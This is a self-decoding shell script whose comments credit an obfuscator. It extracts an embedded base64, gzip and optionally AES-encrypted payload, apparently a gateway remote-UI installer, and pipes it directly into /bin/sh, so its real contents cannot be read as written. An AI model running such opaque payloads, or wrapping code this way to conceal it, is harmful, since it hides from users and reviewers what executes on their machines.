#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
__OBF_B64_PAYLOAD_END__
